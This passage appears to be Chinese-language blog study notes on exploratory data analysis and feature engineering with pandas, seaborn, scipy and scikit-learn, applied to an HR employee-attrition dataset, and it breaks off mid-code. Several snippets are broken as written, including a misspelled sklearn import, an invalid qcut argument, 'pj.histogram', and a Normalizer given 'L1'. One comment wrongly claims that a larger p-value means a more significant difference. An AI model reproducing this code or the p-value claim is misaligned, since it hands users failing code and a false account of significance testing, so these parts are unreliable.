<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">le = df[&quot;last_evaluation&quot;]</span><br><span class="line">q_low = le.quantile(q=0.25)</span><br><span class="line">q_high = le.quantile(q=0.75)</span><br><span class="line">q_interval = q_high - q_low</span><br><span class="line">k = 1.5</span><br><span class="line">le = le[le &lt; q_high + k * q_interval][le &gt; q_low - k * q_interval]</span><br></pre></td></tr></table></figure>

<p>查看离散值峰度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pj = df[&quot;number_projcet&quot;]</span><br><span class="line">pj.value_counts()</span><br><span class="line">pj.value_counts(normalize=True).sort_index()</span><br></pre></td></tr></table></figure>

<p>数据分段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pj.value_counts(bins=10)   # 左开右闭</span><br><span class="line">pj.histogram(sl.values, bins=10)  # 左闭右开</span><br></pre></td></tr></table></figure>

<p>分组聚合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">df.groupby(&quot;department&quot;).mean()</span><br><span class="line">df.loc[:, [&#x27;last_evaluation&#x27;, &#x27;department&#x27;]].groupby(&quot;department&quot;).mean()</span><br><span class="line">df.loc[:, [&#x27;average_monthly_hours&#x27;, &#x27;department&#x27;]].groupby(&#x27;department&#x27;)[&#x27;average_monthly_hours&#x27;].apply(lambda x: x.max() - x.min())</span><br></pre></td></tr></table></figure>

<h3 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h3><p>常用库</p>
<ul>
<li>matplotlib</li>
<li>seaborn</li>
<li>plotly</li>
</ul>
<p>条形图、柱状图：观察离散值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">%matplotlib notebook # Jupyter notebook 使用</span><br><span class="line"># %matplotlib inline</span><br><span class="line"></span><br><span class="line"># 设置图像风格</span><br><span class="line">sns.set_style(style=&#x27;darkgrid&#x27;)</span><br><span class="line"></span><br><span class="line">plt.title(&#x27;Salary&#x27;)</span><br><span class="line">plt.xlabel(&#x27;salary&#x27;)</span><br><span class="line">plt.ylabel(&#x27;count&#x27;)</span><br><span class="line">plt.xticks(</span><br><span class="line">    np.arange(len(df[&#x27;salary&#x27;].value_counts())) + 0.5, # +0.5 使其右移</span><br><span class="line">    df[&#x27;salary&#x27;].value_counts().index</span><br><span class="line">)</span><br><span class="line">plt.axis([0, 4, 0, 10000])</span><br><span class="line">plt.bar(</span><br><span class="line">    np.arange(len(df[&#x27;salary&#x27;].value_counts())) + 0.5, </span><br><span class="line">    df[&#x27;salary&#x27;].value_counts(),</span><br><span class="line">    width=0.5</span><br><span class="line">)</span><br><span class="line"># 添加标注</span><br><span class="line">for x, y in zip(np.arange(len(df[&#x27;salary&#x27;].value_counts())) + 0.5, df[&#x27;salary&#x27;].value_counts()):</span><br><span class="line">    # Label (x, y) 坐标，标注的值，水平位置，垂直位置</span><br><span class="line">    plt.text(x, y, y, ha=&#x27;center&#x27;, va=&#x27;bottom&#x27;)</span><br><span class="line">sns.countplot(x=&#x27;salary&#x27;, data=df)</span><br><span class="line"># sns.countplot(x=&#x27;salary&#x27;, hue=&#x27;department&#x27;, data=df)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>直方图：观察连续值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">df = df.dropna()</span><br><span class="line">f = plt.figure()</span><br><span class="line">f.add_subplot(1, 3, 1)</span><br><span class="line">sns.histplot(df[&#x27;satisfaction_level&#x27;], bins=10, kde=True)</span><br><span class="line">f.add_subplot(1, 3, 2)</span><br><span class="line">sns.histplot(df[&#x27;last_evaluation&#x27;], bins=10, kde=True)</span><br><span class="line">f.add_subplot(1, 3, 3)</span><br><span class="line">sns.histplot(df[&#x27;average_monthly_hours&#x27;], bins=10, kde=True)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>箱线图：上界、下界、四分位数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sns.boxplot(y=df[&#x27;time_spend_company&#x27;])  # 竖着</span><br><span class="line">plt.show()</span><br><span class="line">sns.boxplot(x=df[&#x27;time_spend_company&#x27;], saturation=0.75, whis=3)  # 横着</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>折线图：数据变化走势</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub_df = df.groupby(&#x27;time_spend_company&#x27;).mean()</span><br><span class="line"># sns.pointplot(sub_df.index, sub_df[&#x27;left&#x27;])</span><br><span class="line">sns.pointplot(x=&#x27;time_spend_company&#x27;, y=&#x27;left&#x27;, data=df)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>饼图：结构分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lb = df[&#x27;department&#x27;].value_counts().index</span><br><span class="line">explodes = [0.1 if i == &#x27;sales&#x27; else 0 for i in lb] # 间隔</span><br><span class="line">plt.pie(</span><br><span class="line">    df[&#x27;department&#x27;].value_counts(normalize=True),</span><br><span class="line">    labels=lb,</span><br><span class="line">    autopct=&quot;%1.1f%%&quot;,</span><br><span class="line">    colors=sns.color_palette(&quot;Reds&quot;),</span><br><span class="line">    explode=explodes</span><br><span class="line">)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>其他方案：</p>
<ul>
<li>散点图</li>
<li>极轴图</li>
<li>雷达图</li>
<li>气泡图</li>
</ul>
<h3 id="多因子数据分析"><a href="#多因子数据分析" class="headerlink" title="多因子数据分析"></a>多因子数据分析</h3><p>假设检验：根据假设条件，从样本推断总体，或推断样本与样本之间的关系。</p>
<ul>
<li>原假设 H0 符合某个分布</li>
<li>备择假设 H1 不符合该分布</li>
<li>检验统计量：用于判断是否符合某个分布</li>
<li>显著性水平：确定拒绝域 (取0.05)</li>
<li>最后计算P值，或样本统计值，做出判断（P &gt; 0.05 接受）</li>
</ul>
<p>检验方法</p>
<ul>
<li>u 检验：检验是否复合正态分布</li>
<li>卡方检验：检验两个因素之间是否有比较强的联系</li>
<li>T 分布检验：分布是否一致</li>
<li>F 检验（方差检验）：多样本，两两之间是否有差异<ul>
<li>SST 整体的方差 </li>
<li>SSM 组间平方和：每组与整体均值的平方和 </li>
<li>SSE 组内平方和：数据与组内的均值的平方和</li>
<li>F &#x3D; (SSM &#x2F; (m - 1)) &#x2F; (SSE &#x2F; (n - m))</li>
</ul>
</li>
</ul>
<p>相关系数</p>
<ul>
<li>Pearson 皮尔逊相关系数：因变量与自变量的相关性</li>
<li>Spearman 斯皮尔曼相关系数：跟名次有关，适合相对的比较</li>
</ul>
<p>线性回归：分析两变量之间定量关系。</p>
<ul>
<li>效果判定：决定系数（一元），残差不相关（多元），DW 检验（范围(0, 4)，好的回归 DW&#x3D;2）</li>
</ul>
<p>主成分分析：提取区分度大的维度</p>
<ul>
<li>求特征协方差矩阵</li>
<li>求特征值，特征向量</li>
<li>取最大的k个特征值</li>
<li>重新投影样本点到特征向量上</li>
</ul>
<p>奇异值分解：一种PCA方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import scipy.stats as ss</span><br><span class="line"></span><br><span class="line"># 产生20个符合正态分布的数据</span><br><span class="line">norm = ss.norm.rvs(size=20)</span><br><span class="line"># 检查是否符合正态分布（采用偏度和峰度方法）得到 检验统计量的值 和 P值</span><br><span class="line">ss.normaltest(norm)</span><br><span class="line"># 卡方 检验统计量的值  P值  自由度  理论分布</span><br><span class="line">ss.chi2_contingency([[15, 95], [85, 15]])</span><br><span class="line"># T分布 检验统计量的值  P值</span><br><span class="line">ss.ttest_ind(ss.norm.rvs(size=10), ss.norm.rvs(size=20))</span><br><span class="line"># 方差检验 </span><br><span class="line">ss.f_oneway([49, 50, 39, 40, 43], [28, 32, 30, 26, 34], [38, 40, 45, 42, 48])</span><br></pre></td></tr></table></figure>

<p>通过QQ图方法判断一个分布是否与某已知分布重合。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from statsmodels.graphics.api import qqplot</span><br><span class="line">from matplotlib import pyplot as plt</span><br><span class="line"></span><br><span class="line"># 检验是否是正态分布</span><br><span class="line">plt.show(qqplot(</span><br><span class="line">    ss.norm.rvs(size=100)</span><br><span class="line">))</span><br></pre></td></tr></table></figure>

<p>计算相关性系数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 构造数据</span><br><span class="line">sa = pd.Series([1, 2, 11, 24, 13, 3, 5])</span><br><span class="line">sb = pd.Series([5, 4, 12, 25, 11, 7, 1])</span><br><span class="line">df = pd.DataFrame(np.array([sa, sb]).T) # 转化为两个列向量</span><br><span class="line"></span><br><span class="line"># 求斯皮尔曼相关系数</span><br><span class="line">sa.corr(sb, method=&#x27;spearman&#x27;)</span><br><span class="line"></span><br><span class="line"># 求皮尔逊相关系数</span><br><span class="line">df.corr()</span><br></pre></td></tr></table></figure>

<p>线性回归</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.linear_model import LinearRegression</span><br><span class="line"># 构造数据</span><br><span class="line">x = np.arange(10).astype(np.float64).reshape((10, 1))</span><br><span class="line">y = x * 3 + 4 + np.random.random((10, 1))</span><br><span class="line"></span><br><span class="line"># 线性回归</span><br><span class="line">reg = LinearRegression()</span><br><span class="line">res = reg.fit(x, y)</span><br><span class="line">y_pred = reg.predict(x)</span><br><span class="line">reg.coef_  # 斜率</span><br><span class="line">reg.intercept_  # 截距</span><br></pre></td></tr></table></figure>

<p>PCA 降维</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.decomposition import PCA</span><br><span class="line"># 构造数据</span><br><span class="line">d = np.array([</span><br><span class="line">    np.array([2.5, 0.5, 2.2, 1.9, 3.1, 2.3, 2, 1, 1.5, 1.1]),</span><br><span class="line">    np.array([2.4, 0.7, 2.9, 2.2, 3, 2.7, 1.6, 1.1, 1.6, 0.9])</span><br><span class="line">]).T</span><br><span class="line"></span><br><span class="line"># PCA 降维（奇异值分解）</span><br><span class="line">low = PCA(n_components=1) # 降到 1 维</span><br><span class="line">low.fit(d)</span><br><span class="line">low.explained_variance_ratio_ # 保留的信息比例</span><br><span class="line">low.fit_transform(d) # 降维后的数据</span><br><span class="line"></span><br><span class="line"># 自定义 PCA</span><br><span class="line">def my_pca(data, n_components=1000):</span><br><span class="line">    mean_vals = np.mean(data, axis=0) # 每个属性的均值</span><br><span class="line">    mid = data - mean_vals</span><br><span class="line">    cov_mat = np.cov(mid, rowvar=False) # 按列求协方差</span><br><span class="line">    from scipy import linalg</span><br><span class="line">    eig_vals, eig_vects = linalg.eig(np.mat(cov_mat)) # 求特征值，特征向量</span><br><span class="line">    eig_vals_index = np.argsort(eig_vals) # 获取排序后的下标</span><br><span class="line">    eig_vals_index = eig_vals_index[: -(n_components + 1): -1]</span><br><span class="line">    eig_vects = eig_vects[:, eig_vals_index] # 取出特征向量</span><br><span class="line">    low_dim_mat = np.dot(mid, eig_vects)  # 计算投影后的新矩阵</span><br><span class="line">    return low_dim_mat, eig_vals</span><br></pre></td></tr></table></figure>

<p>复合分析</p>
<ul>
<li>交叉分析：分析属性和属性之间的关系</li>
<li>分组分析：先分组再分析比较。一般与其他手段配合使用。<ul>
<li>钻取：一种常用的分组手段，作用是改变数据维度的层次。分为向上钻取，向下钻取。</li>
<li>分组一般针对离散属性，对于连续属性则需要离散化。连续数据离散化：分割（一阶）、拐点（二阶）、聚类、不纯度（Gini系数）</li>
</ul>
</li>
<li>相关分析<ul>
<li>连续属性：直接计算</li>
<li>离散属性：<ul>
<li>二类离散：皮尔逊相关系数、不纯度（Gini系数）</li>
<li>多类定序离散：可以编码为连续值，进行皮尔逊相关系数计算，但是会失真</li>
<li>熵：（单位：Bit）<ul>
<li>条件熵</li>
<li>互信息：信息增益，条件熵相对于原来的熵减少的信息，对于分类数目多的特征，有不正确的偏向，不确定性是上不封顶的。 I(X, Y) &#x3D; H(Y) - H(Y|X) &#x3D; H(X) - H(X|Y)</li>
<li>熵的增益率：为了解决互信息上不封顶的特性而定，该值范围为 (0, 1)。但是该值不是对称的。 I(X, Y) &#x2F; H(Y)</li>
<li>相关性：解决熵的增益率的对称问题。 corr(X, Y) &#x3D; I(X, Y) &#x2F; sqrt(H(X) * H(Y))</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>因子分析：从多个属性中分析共性的方法。<ul>
<li>探索性因子分析：通过协方差矩阵、相关性矩阵分析，来转化、降维，得到最主要的因子。例如：主成分分析。</li>
<li>验证性因子分析：验证因子与关注的属性有什么关联。假设检验、回归分析等。</li>
</ul>
</li>
<li>聚类分析</li>
<li>回归分析</li>
</ul>
<p>交叉分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 获取数据</span><br><span class="line">df = pd.read_csv(&#x27;.\\data\\HR.csv&#x27;)</span><br><span class="line">df = df.dropna()</span><br><span class="line"></span><br><span class="line"># 不同部门之间的离职率分布是否一致：T 分布检验</span><br><span class="line">ind = df.groupby(&#x27;department&#x27;).indices</span><br><span class="line">sval = df[&#x27;left&#x27;].iloc[ind[&#x27;sales&#x27;]].values  # Sales 部门</span><br><span class="line">tval = df[&#x27;left&#x27;].iloc[ind[&#x27;technical&#x27;]].values  # Technical 部门</span><br><span class="line">ss.ttest_ind(sval, tval)  # T 分布检查，检查是否有显著差异</span><br><span class="line"></span><br><span class="line"># 所有部门之间的关系</span><br><span class="line">key = list(ind.keys())</span><br><span class="line">mat = np.zeros([len(key), len(key)])</span><br><span class="line">for i in range(len(key)):</span><br><span class="line">    for j in range(len(key)):</span><br><span class="line">        p_val = ss.ttest_ind(</span><br><span class="line">            df[&#x27;left&#x27;].iloc[ind[key[i]]].values, </span><br><span class="line">            df[&#x27;left&#x27;].iloc[ind[key[j]]].values</span><br><span class="line">        )[1]  # P 值绝对值越大，显著性差异越大</span><br><span class="line">        mat[i][j] = p_val</span><br><span class="line"></span><br><span class="line"># 热力图</span><br><span class="line">sns.heatmap(mat, xticklabels=key, yticklabels=key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 过去5年是否有晋升：数据透视表</span><br><span class="line">pivtb = pd.pivot_table(</span><br><span class="line">    df, </span><br><span class="line">    values=&#x27;left&#x27;, </span><br><span class="line">    index=[&#x27;promotion_last_5years&#x27;, &#x27;salary&#x27;],</span><br><span class="line">    columns=[&#x27;Work_accident&#x27;],</span><br><span class="line">    aggfunc=np.mean  # 聚合函数</span><br><span class="line">)</span><br><span class="line">sns.heatmap(pivtb, vmin=0, vmax=1, cmap=sns.color_palette(&quot;Reds&quot;, n_colors=256))</span><br></pre></td></tr></table></figure>

<p>分组分析与钻取</p>
<ul>
<li>向上钻取：汇总分组数据</li>
<li>向下钻取：展开分组，查看数据的细节</li>
<li>Gini系数：有标注的情况下可以使用。<ul>
<li>D - 标注，被关注的属性（是否离职）</li>
<li>Ck - 被比较的属性（工资水平）</li>
<li>Gini(D) &#x3D; 1 - sum( (Ck &#x2F; D)^2 )</li>
<li>对于连续值，需要 (1) 将 C 切分为两部分，计算Gini系数 (2) 遍历不同的切分位置重复(1)，得到最小的Gini系数和切分位置</li>
<li>决策树 CART 算法</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 离散值</span><br><span class="line">sns.barplot(</span><br><span class="line">    x=&#x27;salary&#x27;,</span><br><span class="line">    y=&#x27;left&#x27;,</span><br><span class="line">    hue=&#x27;department&#x27;,</span><br><span class="line">    data=df</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 连续值</span><br><span class="line">sc = df[&#x27;satisfaction_level&#x27;]</span><br><span class="line">sns.barplot(</span><br><span class="line">    list(range(len(sc))),</span><br><span class="line">    sc.sort_values()</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>相关分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 连续值：相关系数</span><br><span class="line">sns.heatmap(df.corr(), vmin=-1, vmax=1)  # 自动过滤离散值</span><br><span class="line"># 离散值：熵，条件熵，互信息（熵增益），熵的增益率</span><br><span class="line"># 熵：定义不确定性。都是一类，那么熵就是零；如果各类都差不多，熵最大。</span><br><span class="line"># 条件熵：在一定条件下的熵。</span><br><span class="line"># 相关性：互信息 / 标准差乘积的二次根</span><br><span class="line">m = pd.Series([&#x27;x1&#x27;, &#x27;x1&#x27;, &#x27;x2&#x27;, &#x27;x2&#x27;, &#x27;x2&#x27;, &#x27;x2&#x27;])</span><br><span class="line">n = pd.Series([&#x27;y1&#x27;, &#x27;y1&#x27;, &#x27;y1&#x27;, &#x27;y2&#x27;, &#x27;y2&#x27;, &#x27;y2&#x27;])</span><br><span class="line"></span><br><span class="line">def getEntropy(s):</span><br><span class="line">    s = pd.Series(s)</span><br><span class="line">    p = s.groupby(s).count().values / float(len(s))  # 概率</span><br><span class="line">    return -(np.log2(p) * p).sum()</span><br><span class="line">getEntropy(m)</span><br><span class="line"></span><br><span class="line">def getCondEntropy(s1, s2):</span><br><span class="line">    # 获取 S1 下 S2 的分布</span><br><span class="line">    d = &#123;&#125;</span><br><span class="line">    for i in list(range(len(s1))):</span><br><span class="line">        d[s1[i]] = d.get(s1[i], []) + [s2[i]]</span><br><span class="line">    return sum([getEntropy(d[k]) * len(d[k]) / float(len(s1)) for k in d])</span><br><span class="line">getCondEntropy(m, n)  # 条件熵，不对称</span><br><span class="line"></span><br><span class="line">def getEntropyGain(s1, s2):</span><br><span class="line">    return getEntropy(s2) - getCondEntropy(s1, s2)</span><br><span class="line">getEntropyGain(n, m)  # 互信息，对称</span><br><span class="line"></span><br><span class="line">def getEntropyGainRatio(s1, s2):</span><br><span class="line">    return getEntropyGain(s1, s2) / getEntropy(s2)</span><br><span class="line">getEntropyGainRatio(m, n)  # 熵增益率，不对称</span><br><span class="line"></span><br><span class="line">import math</span><br><span class="line">def getDiscreteCorr(s1, s2):</span><br><span class="line">    return getEntropyGain(s1, s2) / math.sqrt(getEntropy(s1) * getEntropy(s2))</span><br><span class="line">getDiscreteCorr(m, n)  # 离散值的相关性度量，对称</span><br><span class="line"></span><br><span class="line">def getProbSS(s):  # 概率平方和</span><br><span class="line">    s = pd.Series(s)</span><br><span class="line">    p = s.groupby(s).count().values / float(len(s))</span><br><span class="line">    return sum(p**2)</span><br><span class="line"></span><br><span class="line">def getGini(s1, s2):</span><br><span class="line">    d = &#123;&#125;</span><br><span class="line">    for i in list(range(len(s1))):</span><br><span class="line">        d[s1[i]] = d.get(s1[i], []) + [s2[i]]</span><br><span class="line">    return 1 - sum([getProbSS(d[k]) * len(d[k]) / float(len(s1)) for k in d])</span><br><span class="line">getGini(m, n)  # 基尼系数，不对称</span><br></pre></td></tr></table></figure>

<p>因子分析（成分分析）</p>
<ul>
<li>探索性因子分析：降维</li>
<li>验证性因子分析：假设检验，相关分析，回归分析等</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">df = pd.read_csv(&#x27;.\\data\\HR.csv&#x27;).dropna()</span><br><span class="line">pca = PCA(n_components=7)</span><br><span class="line">mat = pca.fit_transform(df.drop(  # 去掉离散值</span><br><span class="line">    labels=[&#x27;salary&#x27;, &#x27;department&#x27;, &#x27;left&#x27;],</span><br><span class="line">    axis=1</span><br><span class="line">))</span><br><span class="line">pca.explained_variance_ratio_</span><br></pre></td></tr></table></figure>

<p>总结</p>
<ul>
<li>连续 - 连续 ：相关系数，假设检验</li>
<li>连续 - 二值离散 ：相关系数，连续二值化（最小Gini切分，最大熵增益切分）</li>
<li>连续 - 非二值离散 ：相关系数（定序）</li>
<li>二值离散 - 二值离散 ：相关系数，熵相关，F分值</li>
<li>非二值离散 - 非二值离散 ：熵相关，Gini，相关系数（定序）</li>
</ul>
<h3 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h3><p>数据集越好，质量越高，则模型复杂度越低。数据的好坏决定了模型的好坏。需要善于观察数据，积累经验。</p>
<ul>
<li>特征使用<ul>
<li>数据选择</li>
<li>可用性判断：安全，成本，时效性</li>
</ul>
</li>
<li>特征获取<ul>
<li>特征来源</li>
<li>特征存储</li>
</ul>
</li>
<li>特征处理<ul>
<li>数据清洗</li>
<li>特征预处理</li>
</ul>
</li>
<li>特征监控：针对模型的长期使用</li>
<li>现有特征</li>
<li>探寻新特征</li>
</ul>
<p>数据样本抽样</p>
<ul>
<li>样本要具有代表性</li>
<li>处理样本平衡问题</li>
<li>考虑全量数据</li>
</ul>
<p>异常值处理：丢弃或转换异常值</p>
<ul>
<li>空值<ul>
<li>字符串 None</li>
<li>数字 NaN</li>
</ul>
</li>
<li>重复值</li>
<li>连续属性的异常值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">isnull()</span><br><span class="line">dropna(subset=[&#x27;field&#x27;])</span><br><span class="line">duplicated([&#x27;field&#x27;])</span><br><span class="line">drop_duplicates([&#x27;field&#x27;], keep=&#x27;first&#x27;) # 重复时要保留的项目</span><br><span class="line">interpolate(mthod=&quot;&quot;, order=&quot;&quot;) # 插值，根据相邻的两个值的平均值</span><br><span class="line"># 还可以使用条件筛选的方法</span><br></pre></td></tr></table></figure>

<p>标注：确定含义。</p>
<p>特征预处理</p>
<ul>
<li>特征选择：剔除与标注不相关和冗余的特征，提高效率，提升准确度<ul>
<li>数据规约<ul>
<li>过滤思想：考察与标注的关系。</li>
<li>包裹思想：确定一个评价指标，通过每次迭代去掉一部分特征，直到评价指标下降过快为止，找到评价指标最优的子集。RFE算法。</li>
<li>嵌入思想：根据模型结果来判断特征的重要性。一般采用正则化的方法。</li>
</ul>
</li>
<li>数据抽样</li>
</ul>
</li>
<li>特征变换：对数、指数、离散、平滑、归一化、数值化、正规化<ul>
<li>对指化：扩大或缩小尺度。Softmax。</li>
<li>离散化、分箱：连续值可能会有噪声，或算法不支持连续数据，或数据非线性，需要离散化。<ul>
<li>等频、等深：排序，分组，每组元素个数相同。之后再用标记替代该值。</li>
<li>等距、等宽：利用极差等宽划分数据。</li>
<li>自因变量优化：</li>
</ul>
</li>
<li>归一化：缩放到 (0, 1) 之间</li>
<li>标准化：将数据转化为标准形式，标准不做规定。 Z-Score 转化</li>
<li>数值化：<ul>
<li>标签化：每一类给一个数字表示，保留原本的信息。</li>
<li>独热编码，One-Hot 编码：转化为向量，每两类之间的距离相等。</li>
</ul>
</li>
<li>正规化：规范化，一般用在对象上（所有特征），模型的参数上（所有参数的L2范数为1）</li>
</ul>
</li>
<li>特征降维<ul>
<li>PCA：无标注参与</li>
<li>LDA：有标注参与：不同标注之间距离尽可能大，同一标注之间距离尽可能小。</li>
</ul>
</li>
<li>特征衍生：现有特征相互组合得到的新特征<ul>
<li>加减乘除</li>
<li>求导</li>
<li>人工归纳</li>
</ul>
</li>
</ul>
<p>特征选择</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line">import scipy.stats as ss</span><br><span class="line"></span><br><span class="line">from sklearn.svm import SVR</span><br><span class="line">from sklearn.tree import DecisionTreeRegressor</span><br><span class="line">from sklearn.feature_selection import SelectKBest, RFE, SelectFromModel # 过滤，包裹，嵌入</span><br><span class="line"></span><br><span class="line"># 数据</span><br><span class="line">df = pd.DataFrame(&#123;</span><br><span class="line">    &#x27;A&#x27;: ss.norm.rvs(size=10),</span><br><span class="line">    &#x27;B&#x27;: ss.norm.rvs(size=10),</span><br><span class="line">    &#x27;C&#x27;: ss.norm.rvs(size=10),</span><br><span class="line">    &#x27;D&#x27;: np.random.randint(low=0, high=2, size=10)</span><br><span class="line">&#125;)</span><br><span class="line">x = df.loc[:, [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;]]</span><br><span class="line">y = df.loc[:, &#x27;D&#x27;]</span><br><span class="line"></span><br><span class="line"># 过滤</span><br><span class="line">skb = SelectKBest(k=2) # 保留 2 个特征</span><br><span class="line">skb.fit(x, y)  # 可以用卡方，互信息，F值等</span><br><span class="line">skb.transform(x)</span><br><span class="line"></span><br><span class="line"># 包裹</span><br><span class="line">rfe = RFE(estimator=SVR(kernel=&#x27;linear&#x27;), n_features_to_select=2, step=1) # step 每次迭代去掉几个特征</span><br><span class="line">rfe.fit_transform(x, y)</span><br><span class="line"></span><br><span class="line"># 嵌入</span><br><span class="line">sfm = SelectFromModel(estimator=DecisionTreeRegressor(), threshold=0.2) # threshold 决定了保留几个特征</span><br><span class="line">sfm.fit_transform(x, y)</span><br></pre></td></tr></table></figure>

<p>特征变换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ll = [6, 8, 10, 15, 16, 24, 25, 40, 67]</span><br><span class="line"></span><br><span class="line"># 等深分箱</span><br><span class="line">pd.qcut(ll, q=3, low=[&#x27;low&#x27;])  # pd.qcut(ll, q=3, labels=[&#x27;low&#x27;, &#x27;mid&#x27;, &#x27;high&#x27;])</span><br><span class="line"># Categories (3, interval[float64]): [(5.999, 13.333] &lt; (13.333, 24.333] &lt; (24.333, 67.0]]</span><br><span class="line"># [&#x27;low&#x27;, &#x27;low&#x27;, &#x27;low&#x27;, &#x27;mid&#x27;, &#x27;mid&#x27;, &#x27;mid&#x27;, &#x27;high&#x27;, &#x27;high&#x27;, &#x27;high&#x27;]</span><br><span class="line"></span><br><span class="line"># 等宽分箱</span><br><span class="line">pd.cut(ll, bins=3)</span><br><span class="line"># Categories (3, interval[float64]): [(5.939, 26.333] &lt; (26.333, 46.667] &lt; (46.667, 67.0]]</span><br><span class="line"># [&#x27;low&#x27;, &#x27;low&#x27;, &#x27;low&#x27;, &#x27;low&#x27;, &#x27;low&#x27;, &#x27;low&#x27;, &#x27;low&#x27;, &#x27;mid&#x27;, &#x27;high&#x27;]</span><br></pre></td></tr></table></figure>

<p>归一化与标准化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.preprocessing import MinMaxScaler, StandardScaler</span><br><span class="line">MinMaxScaler().fit_transform(np.array([1, 3, 10, 15, 20]).reshape(-1, 1))</span><br><span class="line">StandardScaler().fit_transform(np.array([1, 1, 1, 1, 0, 0, 0, 0]).reshape(-1, 1))</span><br></pre></td></tr></table></figure>

<p>数值化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.preprocessing import LabelEncoder, OneHotEncoder</span><br><span class="line"># 标签编码</span><br><span class="line">LabelEncoder().fit_transform(np.array([&#x27;Down&#x27;, &#x27;Up&#x27;, &#x27;Up&#x27;, &#x27;Down&#x27;]).reshape(-1, 1))</span><br><span class="line"># OneHot 编码</span><br><span class="line">lb_encoder = LabelEncoder()</span><br><span class="line">lb_trans_f = lb_encoder.fit_transform(np.array([&#x27;Red&#x27;, &#x27;Blue&#x27;, &#x27;Yello&#x27;]))</span><br><span class="line">oht_encoder = OneHotEncoder().fit(lb_trans_f.reshape(-1, 1))</span><br><span class="line">oht_encoder.transform(lb_encoder.transform(np.array([&#x27;Yello&#x27;, &#x27;Yello&#x27;, &#x27;Blue&#x27;]).reshape(-1, 1))).toarray()</span><br></pre></td></tr></table></figure>

<p>正规化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.preprocessing import Normalizer</span><br><span class="line">Normalizer(norm=&#x27;L1&#x27;).fit_transform(np.array([[1, 1, 3, -1, 2]]))  # 对行正规化</span><br></pre></td></tr></table></figure>

<p>LDA</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.discriminant_analysis import LinearDiscriminantAnalysis</span><br><span class="line"></span><br><span class="line">x = np.array([[-1, -1], [-2, -1], [-3, -2], [1, 1], [2, 1], [3, 2]])</span><br><span class="line">y = np.array([1, 1, 1, 2, 2, 2])</span><br><span class="line"># 降到一维</span><br><span class="line">LinearDiscriminantAnalysis(n_components=1).fit_transform(x, y)  </span><br><span class="line"># 也可以坐判别器使用</span><br><span class="line">clf = LinearDiscriminantAnalysis(n_components=1).fit(x, y) </span><br><span class="line">clf.predict([0.8, 1])</span><br></pre></td></tr></table></figure>

<p>数据预处理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">import numpy as np</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">%matplotlib inline</span><br><span class="line"># %matplotlib notebook</span><br><span class="line">import seaborn as sns</span><br><span class="line">import scipy.stats as ss</span><br><span class="line">from sklearn.decomposition import PCA</span><br><span class="line">from sklearn.svm import SVR</span><br><span class="line">from sklearn.tree import DecisionTreeRegressor</span><br><span class="line">from sklearn.feature_selection import SelectKBest, RFE, SelectFromModel </span><br><span class="line">from sklearn.preprocessing import MinMaxScaler, StandardScaler</span><br><span class="line">from sklearn.preprocessing import LabelEncoder, OneHotEncoder</span><br><span class="line">from sklearn.preprocessing import Normalizer</span><br><span class="line">from sklearn.discriminant_analysis import LinearDiscriminantAnalysis</span><br><span class="line">from sklearn.decompositiion import PCA</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(&quot;./data/HR.csv&quot;).dropna()</span><br><span class="line"># 1. 清洗数据 可以抽样</span><br><span class="line">df = df.dropna(subset=[&#x27;satisfaction_level&#x27;, &#x27;last_evaluation&#x27;])</span><br><span class="line">df = df[df[&#x27;satisfaction_level&#x27;] &lt;= 1][df[&#x27;salary&#x27;] != &#x27;nme&#x27;]</span><br><span class="line"># 2. 得到标注</span><br><span class="line">label = df[&#x27;left&#x27;]</span><br><span class="line">df = df.drop(&#x27;left&#x27;, axis=1)</span><br><span class="line"># 3. 特征选择：根据相关性矩阵，清除不相关的属性（可选）</span><br><span 